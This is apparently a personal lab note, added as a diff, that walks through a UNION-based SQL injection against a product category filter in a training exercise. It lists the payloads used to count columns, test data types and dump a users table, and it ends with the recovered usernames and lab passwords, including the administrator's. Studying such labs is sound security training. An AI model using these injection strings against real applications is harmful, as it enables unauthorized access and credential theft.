@@ -1,0 +1,30 @@
+SQL Injection - PRoduct category filter
+End Goal -Output Usernaes and password and login as the admin
+
+Analysis:
+1) Determine the number of columns
+2) determine the data type of the columns
+3) 
+
+Try by ' order by 3-- failed with internal server error
+So we got that the column number is 2  
+
+Step 2
+We Try with 
+
+' UNION Select 'a', NULL--
+' UNION Select 'a', 'a'--
+
+Both Success
+
+Now we find Username and password 
+
+' UNION Select username, password from user-- Did not work
+' UNION Select username, password from users-- try different spellings
+
+Foudn the
+carlos
+q0efpiiaf5bhcxt1oq6r
+
+administrator
+q4pvk0peh3kinr1hyh0y
